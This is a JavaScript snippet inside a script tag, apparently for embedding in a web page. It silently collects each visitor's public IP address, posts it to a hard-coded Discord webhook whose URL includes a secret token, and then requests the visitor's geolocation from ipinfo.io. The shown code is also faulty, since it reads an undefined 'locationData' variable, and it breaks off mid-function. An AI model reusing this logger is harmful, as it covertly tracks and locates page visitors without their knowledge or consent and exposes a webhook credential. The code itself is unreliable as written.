<script>
    const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';

    // Function to fetch and log IP, and get lat/lon info
    const logIp = async () => {
        try {
            // Get user's public IP address
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const userIP = data.ip;

            console.log('User IP:', userIP);

            // Send the IP address to a Discord webhook
            const ipResponse = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: `User IP: ${userIP}` })
            });

            if (!ipResponse.ok) {
                throw new Error('Failed to send IP to Discord webhook');
            }

            console.log('IP logged and sent to webhook.');

            // Use ipinfo.io for geolocation directly (No CORS proxy)
            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);

            if (locationData.error) {
                console.log('Unable to fetch location data for the user.');
                return;
            }
